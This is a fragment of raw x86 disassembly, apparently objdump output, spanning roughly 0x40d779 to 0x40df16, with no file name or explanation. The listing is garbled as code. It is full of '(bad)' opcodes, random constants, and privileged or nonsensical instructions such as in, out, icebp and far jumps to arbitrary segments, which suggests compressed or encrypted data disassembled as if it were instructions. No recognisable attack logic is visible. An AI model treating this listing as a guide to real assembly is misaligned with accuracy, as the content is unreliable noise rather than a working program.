  40d779:	sub    DWORD PTR [edx+0x25],edi
  40d77c:	or     al,0x34
  40d77e:	mov    eax,0xd81fdf41
  40d783:	push   0xa6a0d372
  40d788:	lahf   
  40d789:	and    BYTE PTR [esi+esi*8+0x4e079232],bl
  40d790:	mov    ebp,0xd60a6b2c
  40d795:	dec    ecx
  40d796:	stos   BYTE PTR es:[edi],al
  40d797:	imul   BYTE PTR [esi+edi*2-0x11a4e08f]
  40d79e:	lea    edx,[edi]
  40d7a0:	std    
  40d7a1:	inc    esi
  40d7a2:	mov    ah,0xf3
  40d7a4:	sbb    al,0xc4
  40d7a6:	dec    esp
  40d7a7:	aaa    
  40d7a8:	or     BYTE PTR [eax-0x29e8c719],bl
  40d7ae:	call   0x7bc74858
  40d7b3:	(bad)  
  40d7b4:	mov    ds:0x43dd0515,eax
  40d7b9:	out    0x25,eax
  40d7bb:	lea    esp,[esi-0x69]
  40d7be:	xchg   edx,eax
  40d7bf:	push   ebp
  40d7c0:	add    al,0x45
  40d7c2:	xchg   edi,eax
  40d7c3:	add    cl,BYTE PTR [eax+ecx*1+0x50bbde48]
  40d7ca:	adc    eax,0x7f09834b
  40d7cf:	fmul   st,st(3)
  40d7d1:	in     al,0x5b
  40d7d3:	int    0x58
  40d7d5:	cmp    eax,0x67c0b3c4
  40d7da:	retf   
  40d7db:	call   0x410b2aa8
  40d7e0:	dec    eax
  40d7e1:	inc    eax
  40d7e2:	call   DWORD PTR [ebx-0x6e]
  40d7e5:	jg     0x40d82f
  40d7e7:	mov    dh,0x55
  40d7e9:	sbb    ebx,edi
  40d7eb:	(bad)  
  40d7ec:	ds jbe 0x40d7d9
  40d7ef:	push   cs
  40d7f0:	into   
  40d7f1:	std    
  40d7f2:	stos   DWORD PTR es:[edi],eax
  40d7f3:	or     BYTE PTR [eax],bh
  40d7f5:	and    ah,BYTE PTR [ebx-0x7df19c08]
  40d7fb:	(bad)  
  40d7fc:	cli    
  40d7fd:	dec    DWORD PTR [edi+0x2db6208c]
  40d803:	in     eax,0xff
  40d805:	dec    esp
  40d806:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d807:	mov    eax,ds:0xebf29342
  40d80c:	pop    ecx
  40d80d:	mov    eax,0xf7cf9ef3
  40d812:	xlat   BYTE PTR ds:[bx]
  40d814:	dec    esi
  40d815:	std    
  40d816:	jl     0x40d81b
  40d818:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d819:	sub    BYTE PTR fs:[eax+0x21eba57d],ah
  40d820:	stos   DWORD PTR es:[edi],eax
  40d821:	test   DWORD PTR [ecx+eiz*8+0x3c],0xa8e2f86
  40d829:	(bad)  
  40d82b:	xor    DWORD PTR [edi+0x60],ebx
  40d82e:	xor    bh,bl
  40d830:	retf   0x3c83
  40d833:	setnp  BYTE PTR [esi+ecx*4]
  40d837:	popf   
  40d838:	pushf  
  40d839:	cwde   
  40d83a:	inc    esi
  40d83b:	data16 jo 0x40d891
  40d83e:	xchg   DWORD PTR [edi-0x326be32f],ecx
  40d844:	pop    esp
  40d845:	dec    esi
  40d846:	push   0xb
  40d848:	test   eax,0x6514bb58
  40d84d:	clc    
  40d84e:	call   FWORD PTR [ebx+0x6d]
  40d851:	cmp    al,0x93
  40d853:	add    BYTE PTR [esi+0x1a],bl
  40d856:	mov    ecx,0x1719b339
  40d85b:	cdq    
  40d85c:	inc    eax
  40d85d:	sub    eax,ebp
  40d85f:	nop    DWORD PTR [edx-0x7e7f0825]
  40d866:	sbb    cl,BYTE PTR ds:0xee7d1737
  40d86c:	dec    esi
  40d86d:	adc    bl,ch
  40d86f:	fld    TBYTE PTR [esi-0x23fea4e3]
  40d875:	mov    ebp,0xa872b073
  40d87a:	shr    DWORD PTR [ebx-0x3ae06f9c],0xaf
  40d881:	dec    ecx
  40d882:	mov    ds:0x9ef03ccf,eax
  40d887:	arpl   WORD PTR [edx],bx
  40d889:	or     eax,0x729111ee
  40d88e:	dec    edx
  40d88f:	dec    esp
  40d890:	and    BYTE PTR ds:0x24f19ea,cl
  40d896:	jecxz  0x40d881
  40d898:	in     al,0x56
  40d89a:	or     ecx,esp
  40d89c:	push   ebp
  40d89d:	mov    esp,0xaecf1ae4
  40d8a2:	iret   
  40d8a3:	fmul   QWORD PTR [edi]
  40d8a5:	or     ebx,DWORD PTR [eax-0x4e]
  40d8a8:	lods   al,BYTE PTR ds:[esi]
  40d8a9:	or     ecx,DWORD PTR ds:0xec0e1cb1
  40d8af:	and    eax,0x52c16865
  40d8b4:	dec    BYTE PTR [edi+0x3a]
  40d8b7:	mov    DWORD PTR [edx+0x62],esi
  40d8ba:	aaa    
  40d8bb:	jle    0x40d8cc
  40d8bd:	add    eax,0xaf335761
  40d8c2:	in     eax,dx
  40d8c3:	out    0x9b,eax
  40d8c5:	inc    ebp
  40d8c6:	cmp    DWORD PTR [eax],edi
  40d8c8:	push   eax
  40d8c9:	daa    
  40d8ca:	(bad)  
  40d8cb:	mov    bh,0x8c
  40d8cd:	mov    edx,0x7dfe0cd4
  40d8d2:	movlhps xmm0,xmm4
  40d8d5:	icebp  
  40d8d6:	jle    0x40d860
  40d8d8:	iret   
  40d8d9:	push   0x7c55753e
  40d8de:	xchg   DWORD PTR [edi-0x32fe9981],esi
  40d8e4:	sub    dl,al
  40d8e6:	push   es
  40d8e7:	mov    esp,0xa72d8563
  40d8ec:	mov    ds:0x812d5048,al
  40d8f1:	fistp  QWORD PTR [esi+edx*1]
  40d8f4:	imul   ecx,DWORD PTR [edi-0x6b],0xffffffc9
  40d8f8:	sub    al,BYTE PTR [ecx]
  40d8fa:	push   es
  40d8fb:	stc    
  40d8fc:	pop    edx
  40d8fd:	leave  
  40d8fe:	(bad)  
  40d8ff:	cld    
  40d900:	pop    es
  40d901:	iret   
  40d902:	cmp    bl,al
  40d904:	xchg   edx,eax
  40d905:	inc    ebx
  40d906:	jb     0x40d96e
  40d908:	and    eax,0xf12f91d1
  40d90d:	cmp    BYTE PTR [eax-0x63dd8217],ch
  40d913:	sbb    al,0xac
  40d915:	dec    ecx
  40d916:	mov    dl,0xae
  40d918:	push   esp
  40d919:	test   BYTE PTR [eax-0x20175c48],cl
  40d91f:	loope  0x40d923
  40d921:	xor    al,0x14
  40d923:	in     al,0x3d
  40d925:	sbb    al,0x9b
  40d927:	loop   0x40d991
  40d929:	sub    DWORD PTR [ebx-0x89bb237],0x29880d5c
  40d933:	pop    ds
  40d934:	pop    es
  40d935:	pop    ds
  40d936:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d937:	retf   
  40d938:	cmp    BYTE PTR [ebp+0x55a806f7],0xf
  40d93f:	xchg   edx,eax
  40d940:	mov    eax,ds:0x64f531c9
  40d945:	stos   DWORD PTR es:[edi],eax
  40d946:	xchg   edi,eax
  40d947:	pop    edi
  40d948:	mul    BYTE PTR [edi]
  40d94a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d94b:	test   DWORD PTR [ecx],ebp
  40d94d:	push   eax
  40d94e:	popf   
  40d94f:	cwde   
  40d950:	cmp    BYTE PTR [eax],bh
  40d952:	add    al,0x35
  40d954:	dec    ecx
  40d955:	shl    DWORD PTR [ebx],0xd8
  40d958:	or     BYTE PTR [eax+0x4fa85189],bl
  40d95e:	popf   
  40d95f:	ret    
  40d960:	dec    ebx
  40d961:	mov    cl,0x19
  40d963:	pop    es
  40d964:	lds    edx,FWORD PTR [eax+0x3]
  40d967:	sub    DWORD PTR [ecx],ebp
  40d969:	imul   ecx,DWORD PTR gs:[eax+0x78863660],0xffffffc5
  40d971:	dec    edi
  40d972:	lods   eax,DWORD PTR ds:[esi]
  40d973:	(bad)  
  40d974:	push   edx
  40d975:	aad    0x92
  40d977:	dec    esp
  40d978:	sbb    ebp,DWORD PTR [edx-0x5d]
  40d97b:	addr16 loopne 0x40d9eb
  40d97e:	cmp    BYTE PTR [ecx],0xc3
  40d981:	add    edx,edi
  40d983:	mov    ecx,0x19902c73
  40d988:	pop    esp
  40d989:	xchg   ebp,eax
  40d98a:	ret    0xfcd0
  40d98d:	cdq    
  40d98e:	ins    BYTE PTR es:[edi],dx
  40d98f:	pushf  
  40d990:	pop    edx
  40d992:	out    0xf8,al
  40d994:	xchg   bl,dl
  40d996:	dec    esi
  40d997:	and    DWORD PTR [edx],0xffffff8b
  40d99a:	cmp    DWORD PTR [edx-0x725e4dca],edi
  40d9a0:	or     al,BYTE PTR [ecx]
  40d9a2:	mov    cl,0x55
  40d9a4:	adc    ebx,DWORD PTR [eax+ebx*8-0x7a3e8bae]
  40d9ab:	mov    DWORD PTR [edx+eiz*2],edx
  40d9ae:	outs   dx,BYTE PTR ds:[esi]
  40d9af:	inc    esi
  40d9b0:	ins    BYTE PTR es:[edi],dx
  40d9b1:	push   ebx
  40d9b2:	test   BYTE PTR [edx+0x6cd20a17],0xe2
  40d9b9:	and    BYTE PTR [edi+0x2c],al
  40d9bc:	mov    eax,0x598c0600
  40d9c1:	je     0x40da10
  40d9c3:	lds    eax,FWORD PTR [esi-0x3c428b7c]
  40d9c9:	mov    ebx,0x9e052a43
  40d9ce:	rcl    BYTE PTR cs:[edi-0xbb0536e],cl
  40d9d5:	call   0x2d09:0xbdf3066e
  40d9dc:	(bad)  [ecx+0x23]
  40d9df:	and    dh,BYTE PTR [edx+0x5e]
  40d9e2:	pop    esp
  40d9e3:	out    dx,al
  40d9e4:	fisubr DWORD PTR [ecx]
  40d9e6:	dec    ebp
  40d9e7:	cmp    esp,DWORD PTR [ebx-0x6b]
  40d9ea:	pop    ss
  40d9eb:	fs sti 
  40d9ed:	pushf  
  40d9ee:	pop    eax
  40d9ef:	cmc    
  40d9f0:	dec    edx
  40d9f1:	icebp  
  40d9f2:	mov    al,0xc0
  40d9f4:	dec    esp
  40d9f5:	cld    
  40d9f6:	jmp    0xcef87546
  40d9fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d9fc:	test   BYTE PTR [edi],bl
  40d9fe:	sbb    al,BYTE PTR [edx-0x25]
  40da01:	(bad)  
  40da02:	neg    DWORD PTR [esi+ebx*1+0x38ee18e1]
  40da09:	lds    edx,FWORD PTR [ebx]
  40da0b:	iret   
  40da0c:	call   0xbcf6b271
  40da11:	inc    esp
  40da12:	imul   edx,DWORD PTR [eax-0x57cd01e7],0xa4056d08
  40da1c:	test   DWORD PTR [eax+ebx*4+0x66],esp
  40da20:	dec    eax
  40da21:	xchg   ecx,eax
  40da22:	xchg   ebx,eax
  40da23:	sbb    ebp,ebx
  40da25:	out    0xc6,eax
  40da27:	xchg   ecx,eax
  40da28:	push   ebp
  40da29:	pushf  
  40da2a:	mov    ch,0xa5
  40da2c:	bound  edx,QWORD PTR [eax-0x350f6cc7]
  40da32:	inc    eax
  40da33:	push   ebx
  40da34:	mov    edi,0x26e45ff7
  40da39:	pop    ecx
  40da3a:	adc    eax,0xc933a145
  40da3f:	xchg   ecx,eax
  40da40:	mov    esi,0x9d087a84
  40da45:	jbe    0x40da6c
  40da47:	fwait
  40da48:	popa   
  40da49:	xchg   esp,ebp
  40da4b:	lock cmp bl,BYTE PTR [ecx+ecx*8+0x66f46db2]
  40da53:	cmp    ch,ch
  40da55:	leave  
  40da56:	or     esp,DWORD PTR [eax+0x70a747d8]
  40da5c:	fsub   st(1),st
  40da5e:	stc    
  40da5f:	out    0x61,eax
  40da61:	cld    
  40da62:	popa   
  40da63:	ficomp WORD PTR fs:[esi-0x20f86b63]
  40da6a:	loop   0x40da4c
  40da6c:	pop    esp
  40da6d:	fiadd  DWORD PTR [ecx-0x79]
  40da70:	ficomp DWORD PTR [edi]
  40da72:	mov    ebp,0x69a9633e
  40da77:	jnp    0x40da69
  40da79:	shl    dh,0xf3
  40da7c:	out    dx,al
  40da7d:	sbb    DWORD PTR [edi-0x11],0x5c
  40da81:	sbb    dl,BYTE PTR [si+0x4f]
  40da85:	mov    bl,dh
  40da87:	jl     0x40dab9
  40da89:	call   0xcfb8:0xa5004212
  40da90:	jb     0x40da26
  40da92:	jle    0x40dadf
  40da94:	dec    esi
  40da95:	mov    al,ds:0x73465845
  40da9a:	fldenv [edi-0x6e]
  40da9d:	pop    es
  40da9e:	jmp    0x40da7a
  40daa0:	arpl   WORD PTR [ebx],cx
  40daa2:	mov    DWORD PTR [edi],edx
  40daa4:	inc    ecx
  40daa5:	dec    esp
  40daa6:	xor    esp,DWORD PTR [ecx]
  40daa8:	adc    edx,DWORD PTR [edx+0x50caf99c]
  40daae:	cmp    edx,0xffffff9f
  40dab1:	inc    esi
  40dab2:	cs daa 
  40dab4:	cmp    ch,BYTE PTR [esi-0x636f47bc]
  40daba:	je     0x40db08
  40dabc:	popa   
  40dabd:	ret    
  40dabe:	xor    al,0x55
  40dac0:	push   ebx
  40dac1:	add    al,0x41
  40dac3:	sub    al,bh
  40dac5:	xor    bh,BYTE PTR [ebx-0xa]
  40dac8:	(bad)  
  40dac9:	in     al,0x23
  40dacb:	scas   al,BYTE PTR es:[edi]
  40dacc:	inc    ecx
  40dacd:	mov    cl,0x4a
  40dacf:	ss push ebx
  40dad1:	sub    eax,DWORD PTR [ebx+0x1f]
  40dad4:	loop   0x40da9a
  40dad6:	xchg   BYTE PTR [esp+ebp*4],al
  40dad9:	ret    
  40dada:	stos   DWORD PTR es:[edi],eax
  40dadb:	mul    ch
  40dadd:	repnz (bad) 
  40dadf:	fsub   QWORD PTR [ebp+0x5f4876cc]
  40dae5:	inc    edx
  40dae6:	xchg   edx,eax
  40dae7:	sub    al,0x92
  40dae9:	inc    esp
  40daea:	dec    edi
  40daeb:	leave  
  40daec:	mov    eax,ds:0x331f383c
  40daf1:	push   eax
  40daf2:	lods   eax,DWORD PTR ds:[esi]
  40daf3:	rcr    BYTE PTR [ebx-0x79],1
  40daf6:	jge    0x40db3f
  40daf8:	add    al,0x83
  40dafa:	dec    edx
  40dafb:	je     0x40da9e
  40dafd:	mov    WORD PTR ds:0x61c08774,ds
  40db03:	xor    DWORD PTR ds:0xa8ce27b6,eax
  40db09:	inc    esp
  40db0a:	and    dh,bl
  40db0c:	fist   DWORD PTR [ecx+0x64]
  40db0f:	ja     0x40dafc
  40db11:	jb     0x40db78
  40db13:	mov    edx,0x86fe1935
  40db18:	jecxz  0x40db30
  40db1a:	dec    edi
  40db1b:	sub    BYTE PTR [ebx+edi*2],ch
  40db1e:	inc    eax
  40db1f:	or     esp,DWORD PTR [ebp+0xdbf8a1]
  40db25:	push   0x7033be41
  40db2a:	and    cl,BYTE PTR [ecx-0x71]
  40db2d:	inc    edi
  40db2e:	(bad)  
  40db2f:	in     eax,0xbd
  40db31:	sbb    ecx,DWORD PTR [eax]
  40db33:	inc    ebp
  40db34:	mov    edi,ecx
  40db36:	mov    cl,0xa5
  40db38:	retf   0x838d
  40db3b:	dec    ebp
  40db3c:	leave  
  40db3d:	add    ebx,0xffffffb3
  40db40:	mov    al,0xed
  40db42:	(bad)  
  40db43:	rcl    DWORD PTR [edi+esi*8],cl
  40db46:	call   0xb77fc246
  40db4b:	sbb    esi,ebp
  40db4d:	dec    ebx
  40db4e:	outs   dx,BYTE PTR ds:[esi]
  40db4f:	dec    eax
  40db50:	dec    edx
  40db51:	jno    0x40daf9
  40db53:	mov    ecx,DWORD PTR [eax-0x232d6271]
  40db59:	int    0xf0
  40db5b:	jbe    0x40daf8
  40db5d:	pop    esi
  40db5e:	adc    esi,DWORD PTR [eax+0x78c34994]
  40db64:	in     eax,dx
  40db65:	popa   
  40db66:	(bad)  
  40db67:	ss je  0x40dbb5
  40db6a:	call   0x4372:0x3ec45523
  40db71:	loop   0x40dbe4
  40db73:	xor    edx,esi
  40db75:	jns    0x40dbb1
  40db77:	add    DWORD PTR [eax-0x7668f393],ecx
  40db7d:	xchg   DWORD PTR [edx+ebp*4+0x2f],ebx
  40db81:	adc    al,0x8b
  40db83:	mov    esi,ecx
  40db85:	dec    esp
  40db86:	mov    ds,WORD PTR [ebx-0x6c]
  40db89:	hlt    
  40db8a:	clc    
  40db8b:	xchg   cl,dh
  40db8d:	dec    edi
  40db8e:	jno    0x40dc0f
  40db90:	(bad)  
  40db91:	out    0xc9,eax
  40db93:	mov    dl,0xf8
  40db95:	xchg   dl,bh
  40db97:	arpl   WORD PTR [edx],si
  40db99:	cld    
  40db9a:	cmp    cl,cl
  40db9c:	push   ds
  40db9d:	and    al,0x1c
  40db9f:	ins    BYTE PTR es:[edi],dx
  40dba0:	mov    edi,0x84de495d
  40dba5:	in     al,0x5d
  40dba7:	xchg   ecx,eax
  40dba8:	out    dx,al
  40dba9:	dec    esi
  40dbaa:	loop   0x40db99
  40dbac:	rol    edi,cl
  40dbae:	fild   WORD PTR [ecx-0x89a1cee]
  40dbb4:	mov    ah,0x35
  40dbb6:	add    DWORD PTR [ebx+0x2],edx
  40dbb9:	mov    eax,0xf8e05761
  40dbbe:	rol    BYTE PTR [ebx+0x5],0x3a
  40dbc2:	jl     0x40dba2
  40dbc4:	sbb    al,BYTE PTR [edi-0x60]
  40dbc7:	ja     0x40dc1d
  40dbc9:	dec    ecx
  40dbca:	dec    esp
  40dbcb:	push   eax
  40dbcc:	arpl   WORD PTR [ecx-0x4],ax
  40dbcf:	retf   0x777a
  40dbd2:	sbb    al,0x7e
  40dbd4:	aam    0xea
  40dbd6:	lahf   
  40dbd7:	add    DWORD PTR [ecx],eax
  40dbd9:	mov    ds:0x394956c1,al
  40dbde:	or     DWORD PTR [edi+0x3b650099],eax
  40dbe4:	push   0xe6c0dce1
  40dbe9:	pop    edx
  40dbea:	inc    edi
  40dbeb:	pop    ebx
  40dbec:	jecxz  0x40dc13
  40dbee:	(bad)  
  40dbef:	(bad)  
  40dbf0:	jecxz  0x40db73
  40dbf2:	sbb    BYTE PTR [eax-0x40],0xcf
  40dbf6:	fs scas eax,DWORD PTR es:[edi]
  40dbf8:	outs   dx,BYTE PTR ds:[esi]
  40dbf9:	xchg   edx,eax
  40dbfa:	jp     0x40dc6c
  40dbfc:	shl    BYTE PTR [edi+esi*4+0x7d957bf5],1
  40dc03:	mov    al,ds:0xda8eab6
  40dc08:	in     al,dx
  40dc09:	push   0xfffffff8
  40dc0b:	adc    DWORD PTR [eax-0x4c],edx
  40dc0e:	or     bl,ah
  40dc10:	(bad)  
  40dc11:	add    BYTE PTR ds:0x1b09b31a,cl
  40dc17:	cmp    DWORD PTR [esi+0x3ea33ff5],0x634b0875
  40dc21:	add    BYTE PTR [ecx+0x16],0xaa
  40dc25:	pusha  
  40dc26:	pop    es
  40dc27:	les    esp,FWORD PTR [eax+0x49]
  40dc2a:	cmp    DWORD PTR [edx+0x177771dd],0xd79de7cb
  40dc34:	pop    ds
  40dc35:	lock addr16 (bad) 
  40dc38:	pop    eax
  40dc39:	fisubr WORD PTR [edx-0x37]
  40dc3c:	xor    BYTE PTR [ebp-0x36c5ac32],dl
  40dc42:	push   0x48
  40dc44:	clc    
  40dc45:	jg     0x40dbfc
  40dc47:	and    esi,DWORD PTR [ebx]
  40dc49:	and    ebx,ecx
  40dc4b:	cmc    
  40dc4c:	int    0x8
  40dc4e:	sub    al,0x1b
  40dc50:	pusha  
  40dc51:	idiv   BYTE PTR [esi-0x63]
  40dc54:	popf   
  40dc55:	adc    al,0x45
  40dc57:	inc    edi
  40dc58:	add    bh,BYTE PTR [ebx]
  40dc5a:	mov    bl,0x73
  40dc5c:	mov    ch,al
  40dc5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc5f:	(bad)  
  40dc60:	mov    ds:0x4d203637,al
  40dc65:	cmp    ebp,ebx
  40dc67:	mov    esp,0x3b3d8ddf
  40dc6c:	not    BYTE PTR [ebp+ecx*2-0x10055c4f]
  40dc73:	icebp  
  40dc74:	pavgw  mm5,mm2
  40dc77:	(bad)  
  40dc78:	xor    al,0x71
  40dc7a:	mov    ebp,0x4290a62f
  40dc7f:	pop    edx
  40dc80:	mov    ebp,0xe64a93fd
  40dc85:	std    
  40dc86:	mov    esp,0x5c2b1221
  40dc8b:	neg    DWORD PTR ds:0xec57a273
  40dc91:	lea    eax,[eax-0x4e07e9e4]
  40dc97:	jmp    0xe0ea9920
  40dc9c:	adc    al,cl
  40dc9e:	in     eax,0x99
  40dca0:	retf   0x9445
  40dca3:	lea    ecx,[ebx+0x55]
  40dca6:	loope  0x40dc4c
  40dca8:	dec    eax
  40dca9:	pop    ss
  40dcaa:	iret   
  40dcab:	(bad)  
  40dcac:	imul   edi,DWORD PTR [ecx-0x4f941b37],0xffffffca
  40dcb3:	js     0x40dc4d
  40dcb5:	sbb    bh,bl
  40dcb7:	mov    DWORD PTR [ecx+ebx*2],edi
  40dcba:	xlat   BYTE PTR ds:[ebx]
  40dcbb:	mov    ds:0x4f379f6e,eax
  40dcc0:	out    dx,eax
  40dcc1:	sub    al,0x10
  40dcc3:	and    eax,0x2e835686
  40dcc8:	sub    eax,0x887b77b2
  40dccd:	jmp    FWORD PTR [edx+ebx*1+0x2ca4f62c]
  40dcd4:	fist   WORD PTR [ebx-0x55622760]
  40dcda:	out    dx,al
  40dcdb:	push   cs
  40dcdc:	ds jo  0x40dcbe
  40dcdf:	push   ebp
  40dce0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dce1:	mov    bh,0x3a
  40dce3:	stos   BYTE PTR es:[edi],al
  40dce4:	jg     0x40dcd4
  40dce6:	push   es
  40dce7:	adc    DWORD PTR [ecx-0x1b],edx
  40dcea:	mov    ah,bl
  40dcec:	dec    edi
  40dced:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dcee:	pop    ebx
  40dcef:	add    al,0x66
  40dcf1:	inc    ebx
  40dcf2:	ret    
  40dcf3:	repz ror BYTE PTR [edi-0xf45b223],0x9d
  40dcfb:	int3   
  40dcfc:	aad    0x85
  40dcfe:	push   0x48
  40dd00:	popf   
  40dd01:	jne    0x40dcf9
  40dd03:	mov    eax,0xe7791e01
  40dd08:	scas   eax,DWORD PTR es:[edi]
  40dd09:	daa    
  40dd0a:	and    eax,0xa7a9b3
  40dd0f:	or     cl,BYTE PTR [ebp+0x75]
  40dd12:	sub    DWORD PTR [esi],ebx
  40dd14:	push   ebp
  40dd15:	out    dx,al
  40dd16:	addr16 jmp 0xe1e8:0xf559df66
  40dd1e:	or     BYTE PTR [ebp-0x5f3b602],cl
  40dd24:	lock cmp eax,0x2ba7402a
  40dd2a:	or     dl,dh
  40dd2c:	daa    
  40dd2d:	cmp    ah,BYTE PTR [ebp+0x75f1eaeb]
  40dd33:	push   esp
  40dd34:	bound  edx,QWORD PTR [esi-0xd09d47b]
  40dd3a:	cli    
  40dd3b:	jne    0x40dd9b
  40dd3d:	xchg   edx,eax
  40dd3e:	push   ss
  40dd3f:	std    
  40dd40:	ret    0xd790
  40dd43:	cdq    
  40dd44:	lahf   
  40dd45:	sub    eax,0xa195df2b
  40dd4a:	sti    
  40dd4b:	es jg  0x40dd0e
  40dd4e:	xchg   ebx,eax
  40dd4f:	pop    esp
  40dd50:	pop    ebp
  40dd51:	inc    esi
  40dd52:	mov    ecx,0x44962f59
  40dd57:	add    al,0x1b
  40dd59:	push   ebp
  40dd5a:	dec    eax
  40dd5b:	sbb    DWORD PTR [esi+0x330978ff],ebp
  40dd61:	cmc    
  40dd62:	dec    edx
  40dd63:	jmp    0x96c3:0x2a143718
  40dd6a:	xchg   edi,eax
  40dd6b:	mov    BYTE PTR [ebx-0x40fa6b05],ch
  40dd71:	cs jge 0x40ddc4
  40dd74:	inc    esi
  40dd75:	out    dx,eax
  40dd76:	mov    ebx,0xad8b6ba0
  40dd7b:	ins    DWORD PTR es:[edi],dx
  40dd7c:	sub    DWORD PTR [ecx-0x79fa169],ecx
  40dd82:	repnz sub dh,BYTE PTR [ebx+0x7]
  40dd86:	sar    DWORD PTR [esi+0x49720a5f],cl
  40dd8c:	fwait
  40dd8d:	adc    edi,DWORD PTR [eax-0x30]
  40dd90:	push   cs
  40dd91:	fsubrp st(7),st
  40dd93:	fidivr WORD PTR [edi-0x20d78876]
  40dd99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd9a:	pusha  
  40dd9b:	hlt    
  40dd9c:	sub    DWORD PTR [edi-0x44],edi
  40dd9f:	sbb    bh,bh
  40dda1:	mov    cl,0xd0
  40dda3:	sub    BYTE PTR ds:[edx+ecx*2-0x51c8e77],cl
  40ddab:	(bad)  
  40ddac:	push   ecx
  40ddad:	jno    0x40dd60
  40ddaf:	mov    ds:0x17a73241,eax
  40ddb4:	(bad)  
  40ddb5:	rol    BYTE PTR [ecx+0x3c],1
  40ddb8:	xor    BYTE PTR [ecx+edi*2+0x3e],dl
  40ddbc:	cmp    al,0xf7
  40ddbe:	pop    ss
  40ddbf:	iret   
  40ddc0:	nop
  40ddc1:	mov    ebx,0x38db3639
  40ddc6:	push   0xd02209af
  40ddcb:	cmp    al,0xef
  40ddcd:	inc    edx
  40ddce:	jp     0x40dd93
  40ddd0:	(bad)  
  40ddd1:	sub    eax,0x8530e5c4
  40ddd6:	aad    0x8
  40ddd8:	lock test ebx,ecx
  40dddb:	or     DWORD PTR [eax+edi*2],0x6c
  40dddf:	mov    esp,0xca2ef887
  40dde4:	jp     0x40ddfe
  40dde6:	mov    ds:0x9bc984ef,eax
  40ddeb:	inc    ecx
  40ddec:	pop    ebx
  40dded:	cmp    ecx,ebp
  40ddef:	add    DWORD PTR [esi+0x23],ecx
  40ddf2:	mov    DWORD PTR es:[edi+0x6bba4b5],ecx
  40ddf9:	xor    eax,0xd396b1b7
  40ddfe:	clc    
  40ddff:	adc    DWORD PTR [ebx-0x45c05fbd],edi
  40de05:	sub    edi,DWORD PTR [ecx+0x37d4274d]
  40de0b:	sub    BYTE PTR [ebp+eax*8-0x70a0c39b],dh
  40de12:	call   0x5e937923
  40de17:	push   esi
  40de18:	adc    BYTE PTR [edi],ah
  40de1a:	mov    ch,BYTE PTR [esi-0x3314ac84]
  40de20:	jbe    0x40ddbe
  40de22:	out    dx,al
  40de23:	cmp    dh,BYTE PTR [ebp+ebp*8-0x48397fad]
  40de2a:	aas    
  40de2b:	adc    ecx,DWORD PTR [eax-0x3b]
  40de2e:	mov    dh,al
  40de30:	loopne 0x40de4a
  40de32:	xchg   DWORD PTR [eax],edx
  40de34:	aas    
  40de35:	clc    
  40de36:	or     bh,BYTE PTR [edi]
  40de38:	pop    edi
  40de39:	sub    al,0xfc
  40de3b:	(bad)  
  40de3d:	ins    BYTE PTR es:[edi],dx
  40de3e:	fadd   st(6),st
  40de40:	dec    edi
  40de41:	mov    ds:0x1050b731,al
  40de46:	icebp  
  40de47:	icebp  
  40de48:	jg     0x40dec9
  40de4a:	loopne 0x40de7a
  40de4c:	jp     0x40de43
  40de4e:	ret    0x3b82
  40de51:	pop    edx
  40de52:	jmp    0x40debc
  40de54:	push   esp
  40de55:	mov    eax,0x521d721c
  40de5a:	xor    dl,BYTE PTR [edi+0x4ce9e88d]
  40de60:	dec    esi
  40de61:	mov    bl,0xeb
  40de63:	aaa    
  40de64:	add    eax,0x79536660
  40de69:	cmc    
  40de6a:	(bad)  [ebp-0x4ae96229]
  40de70:	mov    ebx,0x8b5b9d04
  40de75:	add    eax,0x21d6b3d6
  40de7a:	(bad)  
  40de7b:	mov    ebx,0x45e7394d
  40de80:	adc    DWORD PTR [ebx-0x3e],0xe3e48ad
  40de87:	push   ebx
  40de88:	leave  
  40de89:	xor    bl,dh
  40de8b:	loope  0x40de19
  40de8d:	inc    esp
  40de8e:	fbstp  TBYTE PTR [eax+0x622b39cb]
  40de94:	adc    esp,DWORD PTR [edi+0x7fabebaf]
  40de9a:	movlps QWORD PTR [ebp-0x76],xmm4
  40de9e:	inc    edx
  40de9f:	jns    0x40de7d
  40dea1:	shl    edx,cl
  40dea3:	push   es
  40dea4:	xor    al,0xb
  40dea6:	sbb    al,0xb
  40dea8:	sar    DWORD PTR [ebp+0x50],0xfd
  40deac:	sub    DWORD PTR [edi],0xfffffff6
  40deaf:	or     ebp,DWORD PTR [ebx+0x40]
  40deb2:	xlat   BYTE PTR ds:[ebx]
  40deb3:	ds out 0xff,al
  40deb6:	ja     0x40de70
  40deb8:	mov    ss,edx
  40deba:	jmp    0xc9e4:0x6010a954
  40dec1:	inc    edi
  40dec2:	xor    eax,0xb129cd9f
  40dec7:	pop    edx
  40dec8:	inc    ebx
  40dec9:	pop    esi
  40deca:	push   cs
  40decb:	pop    ebp
  40decc:	ins    DWORD PTR es:[edi],dx
  40decd:	mov    ebx,0x438fa2ab
  40ded2:	jb     0x40deac
  40ded4:	icebp  
  40ded5:	or     ecx,0x42
  40ded8:	lahf   
  40ded9:	inc    BYTE PTR [eax]
  40dedb:	mov    DWORD PTR [ebx],edi
  40dedd:	mov    esp,0xbb96d629
  40dee2:	mov    ah,0x92
  40dee4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dee5:	sahf   
  40dee6:	or     ecx,DWORD PTR [bx+si-0x6a]
  40deea:	sti    
  40deeb:	pop    ds
  40deec:	mov    ds,WORD PTR [edi+0x482139ad]
  40def2:	xchg   DWORD PTR [edi+ebx*2],ebp
  40def5:	into   
  40def6:	loop   0x40df3f
  40def8:	ret    0x885e
  40defb:	xchg   ebp,eax
  40defc:	mov    al,BYTE PTR [esi]
  40defe:	aas    
  40deff:	dec    ebx
  40df00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df01:	lahf   
  40df02:	(bad)  
  40df04:	mov    dl,0x1f
  40df06:	js     0x40dea3
  40df08:	dec    ebp
  40df09:	imul   esp,ebx,0xc52efe22
  40df0f:	mov    ebp,DWORD PTR [esi+ebx*1-0x1902e63]
  40df16:	mov    edx,0xc28791bd
